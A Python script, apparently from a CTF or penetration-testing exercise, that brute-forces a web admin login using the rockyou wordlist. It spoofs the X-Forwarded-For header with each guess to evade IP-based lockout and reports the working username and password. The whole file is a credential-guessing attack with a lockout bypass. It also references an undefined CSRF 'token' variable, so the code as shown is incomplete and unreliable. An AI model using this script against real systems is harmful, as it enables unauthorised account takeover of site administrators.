#! /usr/bin/env python3

import requests
import re
import codecs

host = 'ip'
login_url = host + '/admin'
#passlist = ["password1","password2","password3","password4"]
passlist = []
username = 'username'

with codecs.open('/usr/share/wordlists/rockyou.txt' ,'r+',encoding='utf-8',errors='ignore') as f:
    for line in f:
        passlist.append(line)
#print(passlist)
passlist = [ item.strip() for item in passlist]

for password in passlist:
    session = requests.Session()
    login_page = session.get(login_url)
    
    print('[*] Trying This password as IP :{p}'.format(p=password))

    headers = {
        'X-Forwarded-For' : str(password),
        'User-Agent' : 'Mozilla\/5.0 (X11; Linux x86_64; rv:68.0) Gecko\/20100101 Firefox\/68.',
        'Referer': login_url
        }
    data ={
            'tokenCSRF': token,
            'username' : username,
            'password' : password,
            'save' : ''
            }

    login_result = session.post(login_url,headers = headers ,data = data, allow_redirects=False)
    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('Sucess:password found!')
            print(f"use {username}:{password} to login")
            print()
            break
    #print(login_result.headers['location'])
        else:
            print(f"Credentials for login Failed with {username}:{password}")
